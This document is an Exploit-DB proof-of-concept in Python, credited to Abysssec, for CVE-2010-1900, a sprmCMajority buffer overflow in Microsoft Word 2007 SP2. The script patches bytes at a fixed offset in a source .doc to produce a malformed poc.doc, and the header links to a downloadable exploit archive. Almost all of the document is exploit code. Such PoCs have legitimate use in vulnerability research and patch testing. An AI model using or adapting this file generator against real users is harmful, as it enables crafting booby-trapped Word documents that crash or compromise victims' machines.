'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

http://www.exploit-db.com/moaub11-microsoft-office-word-sprmcmajority-buffer-overflow/
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/14971.zip (moaub-11-exploit.zip)
'''

'''
  Title               :  Microsoft Office Word sprmCMajority buffer overflow
  Version             :  Word 2007 SP 2
  Analysis           :  http://www.abysssec.com
  Vendor              :  http://www.microsoft.com
  Impact              :  Critical
  Contact             :  shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter             :  @abysssec
  CVE                 :  CVE-2010-1900

'''

import sys

def main():
   
    try:
		fdR = open('src.doc', 'rb+')
		strTotal = fdR.read()
		str1 = strTotal[:4082]
		str2 = strTotal[4088:]
		
		sprmCMajority = "\x47\xCA\xFF"    # sprmCMajority  
		sprmPAnld80 = "\x3E\xC6\xFF"    # sprmPAnld80
				
		fdW= open('poc.doc', 'wb+')
		fdW.write(str1)
		fdW.write(sprmCMajority)
		fdW.write(sprmPAnld80)				
		fdW.write(str2)
		
		fdW.close()
		fdR.close()
		print '[-] Word file generated'
    except IOError:
        print '[*] Error : An IO error has occurred'
        print '[-] Exiting ...'
        sys.exit(-1)
                
if __name__ == '__main__':
    main()